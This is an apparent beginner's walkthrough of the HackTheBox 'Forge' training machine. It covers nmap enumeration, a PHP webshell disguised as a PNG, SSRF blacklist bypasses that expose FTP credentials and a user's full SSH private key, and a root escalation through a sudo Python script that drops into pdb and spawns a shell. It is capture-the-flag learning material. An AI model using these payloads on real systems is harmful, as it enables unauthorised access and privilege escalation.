# Introduction
Hello, this article contains my first writeup for a HackTheBox(HTB) machine. In it I will be documenting the methods I went through to complete the machine for the first time, including some of the things I tried that were unsuccessful. In the future I plan on doing these for every Active machine I complete, and I will be releasing them as soon as the machine is retired, as HTB preffers. I am still very new to this and any feedback/comments would be very much appreciated. Please let me know what you think I could do better, or which area's I could improve in. This is a learning experience for me.

Without further ado, this is my writeup on HTB's Forge machine.

# Enumeration
Start by preforming a simple nmap scan.
```bash
$nmap -sC -sV 10.10.11.111
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-27 05:27 MST
Nmap scan report for forge.htb (10.10.11.111)
Host is up (0.056s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-title: Gallery
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
```

Notice a filtered FTP service, as well has an apache webserver. Since we ran nmap with default scripts, it would tell us if the FTP server allowed anonymous access, so we can ignore that for now. Lets dig into the webservice.

### Vitual host
In order to access the webpage I had to add the following line to my /etc/hosts file.

	10.10.11.111     forge.htb

When first accessing the page we are greeted with the following.

![Homepage](/Forge/Images/homepage.png)

Lets explore the upload image functionality.

# Uploading Images

![upload](/Forge/Images/upload.png)

There are two ways for us to upload images to the website, via local file and via URL. I chose to start by examining the local file upload

## local file
When we upload an image, a link is returned to us. When the link is clicked we are able to view the image. 

![success](/Forge/Images/success.png)

### testing common image upload vulnerabilities
When I began working on this box, I first tested for common image upload vulnerabilities. 

### php webshell
I tried uploading a php webshell with the extension changed to png

FIle:  web.png
Contents:
```php
<?php
	echo system($_GET['cmd']);
?>
```

Annnnd we get the following error when trying to view the uploaded image

![error](/Forge/Images/error.png)

Before we move on though lets try one more thing, appending the png magic bytes onto our file. If you Are unfamiliar with Magic bytes, they are series of 8 bytes at the start of each file that identify the file type. For more information, check out this article [here](https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198)

The magics bytes for a png file are `89 50 4E 47 0D 0A 1A 0A` 

we can append them onto web.png with the following command.
```bash
$printf '\x89\x50\x4e\x47\x0dx\0a\x1a\x0a' | cat - web.png > newWeb.png
```

Lets try uploading the new file

Once again we get the same error.

At this point I figured that the vulnerability must not have to do with a webshell, so I moved onto upload an image with a URL.

## VIA URL
As a rule of thumb, whenever a website takes in a URL as a parameter, the first thing to check is SSRF. Another big hint here is the name of the machine, Forge, indicating that the vulnerability will probably be based around SSRF. 

So what is SSRF? SSRF or Server Side Request Forgery is when the user provides a crafted link as a parameter to access files that should otherwise not be visable to the user. 

Portswigger has a great article on the topic that goes in depth on the different types of SSRF [here](https://portswigger.net/web-security/ssrf)

### testing common payloads
First, lets try to make a request to localhost. input the URL http://localhost/ into the field and we get the following message:

	URL contains a blacklisted address

This is a vital piece of information, as it indicated that the internal server is parsing user input with a blacklist

try again, this time with http://127.0.0.1/ and we get the same thing

So, we're gonna have to be a bit more clever than that. In the portswigger article there is a section on bypassing blacklist filters. This revolves around using different representations of the loop back IP address, such as decimal format or short hand notation.

When we use the payload http://127.1/ we get passed the blacklist!

However, from this we still can't actually gain anything. If we try to read a file like /etc/passwd, we get the same error as before. The link we get is also not visable via cURL, we get a 400 bad request.

curl:
```bash
$curl http://forge.htb/uploads/PQYpOzjR1HfZmbzKaLHN
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<p>Additionally, a 400 Bad Request
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.11.111 Port 80</address>
</body></html>
```

## Stepping back

Since my attempt at exploiting localhost was a failure, I decided to step back and re-enumerate. One thing I didn't check at the start was the pressece of other subdomains.

Recently, I have noticed that HTB likes using subdomains on their machines. So in the future I'll be sure to enumerate them right away.

Subdomains can be enumerated using ffuf, here is what I got.

```bash
$ffuf -H "Host: FUZZ.forge.htb" -u http://forge.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 18

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://forge.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 18
________________________________________________

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
```

When trying to view the page in my web browser I got the following:

![admin page](/Forge/Images/admin.png)

Once again this points to SSRF, By using SSRF I will be able to make a request to this page from localhost as the request will first be routed through the server.

So, I tried using the parameter http://admin.forge.htb/ in upload from URL to no avail. I got the same message about the URL being blacklisted as before. Once again I looked at the Portswigger article section on SSRF with blacklist-based filters, I noticed the bullet point on how to bypass blacklisted URL's.

		"Obfuscating blocked strings using URL encoding or case variation"

So, I tried using http://admin.Forge.htb/ instead. By capatalizing the F I was able to bypass the blacklist and was given a URL to the uploaded file. 

When I tried to view the file on the webpage I got another error saying the image can not be displayed, but as mentioned before never trust your browser. 

So, I viewed the link returned with curl instead.

### note: the URL will be different

Response:
```bash
$curl http://forge.htb/uploads/n4xJcOgtHU0EVQmLdwgn
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

checkout the announcements page by changing the URL parameter to http://admin.Forge.htb/announcements and repeating the previous steps

Response:
```bash
$curl http://forge.htb/uploads/ogKM7LMoKo0AX7DBWrtI
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

By doing this I obtained ftp credentials, as well as information about additional usability in the admin.forge.htb upload endpoint

## Exploiting FTP upload endpoint
after doing some googling I found that I can access an ftp url with credentials by following the following url format:

	ftp://\<user\>:\<password\>@\<hostname\>.

Craft the payload:

	http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Forge.htb/

Result:
```bash
curl http://forge.htb/uploads/Ck7tHDj72eAwftlND2LG
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Jan 27 16:14 user.txt
```

Check if .ssh exists in the directory.

Payload:

	http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Forge.htb/.ssh/

Result:
```bash
$curl http://forge.htb/uploads/1RN85YdwkQs5T56S2Gvx
-rw-------    1 1000     1000          564 May 31  2021 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub
```

It does, so I read the key

Payload:

	http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Forge.htb/.ssh/id_rsa

Result:
```bash
$curl http://forge.htb/uploads/vpvXtZ8Zg23TzGCNcRal
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

save to a file and log into the box!

```bash
$curl http://forge.htb/uploads/vpvXtZ8Zg23TzGCNcRal > user_id_rsa

$chmod 600 user_id_rsa

$ssh -i user_id_rsa user@forge.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 27 Jan 2022 05:41:55 PM UTC

  System load:  0.0               Processes:             218
  Usage of /:   43.8% of 6.82GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$ ls
snap  user.txt
```

# Where to begin
Whenever I get onto an HTB box I try to poke around as much as I can manually before running a tool such as Linpeas. I do this because Linpeas makes a lot of noise, and sometimes the vulnerablity is easy to find. This is one such case. sudo -l shows us that we can run remote-manage.py as sudo without a password. So, this is where I started my attack.

```bash
$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

# Priv Esc

remote-manage.py contents:

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

Notice the password to access the process is secretadminpassword

### accessing remotely
note: the listening port will be different on your machine
in 1st shell on target:
```bash
user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:61058
```
in 2nd shell on target:
```bash
$ nc localhost 61058
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
1
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.5 101960 11300 ?        Ss   16:13   0:02 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    16:13   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   16:13   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   16:13   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   16:13   0:00 [kworker/0:0H-kblockd]

.................................More Procs here.................................

root        1748  0.0  0.4  13672  9044 ?        Ss   17:55   0:00 sshd: user [priv]
user        1837  0.0  0.2  13680  5304 ?        S    17:55   0:00 sshd: user@pts/1
user        1838  0.0  0.2   8276  5128 pts/1    Ss   17:55   0:00 -bash
user        1851  0.0  0.1   3332  2020 pts/1    S+   17:55   0:00 nc localhost 61058
user        1853  0.0  0.0   2608   544 pts/0    S+   17:55   0:00 /bin/sh -c ps aux
user        1854  0.0  0.1   8892  3324 pts/0    R+   17:55   0:00 ps aux
What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
2
Filesystem                        1K-blocks    Used Available Use% Mounted on
udev                                 958028       0    958028   0% /dev
tmpfs                                200640    1108    199532   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv   7155192 3136144   3929312  45% /
tmpfs                               1003184       0   1003184   0% /dev/shm
tmpfs                                  5120       0      5120   0% /run/lock
tmpfs                               1003184       0   1003184   0% /sys/fs/cgroup
/dev/sda2                            999320  212196    718312  23% /boot
/dev/loop0                            56832   56832         0 100% /snap/core18/2066
/dev/loop1                            56832   56832         0 100% /snap/core18/2074
/dev/loop2                            69248   69248         0 100% /snap/lxd/20326
/dev/loop3                            72064   72064         0 100% /snap/lxd/21029
/dev/loop4                            33152   33152         0 100% /snap/snapd/12704
/dev/loop5                            32896   32896         0 100% /snap/snapd/12057
tmpfs                                200636       0    200636   0% /run/user/1000
What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
3
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN  0        32               0.0.0.0:21             0.0.0.0:*
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*
LISTEN  0        1              127.0.0.1:61058          0.0.0.0:*
LISTEN  0        511                    *:80                   *:*
LISTEN  0        128                 [::]:22                [::]:*
What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
4
Bye
```

# Exploit
While I was looking at the file I noticed two things.
1. The input recieved from the client is being parsed as an integer
2. If there is an exception, remote-manage.py will print the exception and then open up pdb

Since we can run the script as Root, if I can trigger the debugger and escape it I will get a shell as root. We can trigger the exception by entering a non integer input (I inputed hey), as python will try to read it as int, causing an error to occur

## One more time
```bash
$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:7621
```

in another shell:
```bash
$ nc localhost 7621
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do:
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
hey
```

back in the other shell:
```bash
invalid literal for int() with base 10: b'hey'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) 
```

Worked like a charm. From here escaping PDB is pretty straighforward. All we have to do is import the OS module from python and spawn a shell!

```bash
(Pdb) import os
(Pdb) os.system('sh')
# whoami
root
# cd
# ls
clean-uploads.sh  root.txt  snap
# cat root.txt
5c129a3c151d81ac****************
```

And there we have it!

# Final Thoughts
This was my first medium machine completion on HackTheBox and through it I learned a lot about SSRF. The bulk of the challenge for me was getting the SSH key, but as soon as I had that the Priv Esc was relativly straightforward. 

And that concludes my first HTB writeup! I hope you enjoyed reading. As I stated at the start, I am still very new to this and any tips or feedback on what I could do better would be very appreciated! 